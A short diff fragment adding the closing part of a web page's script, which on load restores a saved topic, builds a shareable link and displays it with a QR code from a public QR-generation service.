+    log("Laporan JSON diunduh", "g");
+  };
+
+  window.addEventListener("load", () => {
+    renderHist();
+    const t = localStorage.getItem("sent_topic_v10");
+    if (!t) return;
+    const url = location.origin + location.pathname + "?t=" + t;
+    $("#linkOut").value = url;
+    $("#qr").src = "https://api.qrserver.com/v1/create-qr-code/?size=124x124&data=" + encodeURIComponent(url);
+    $("#qrBox").hidden = false; watch(t);
+  });
+}
+})();
+</script>
+</body>
+</html>
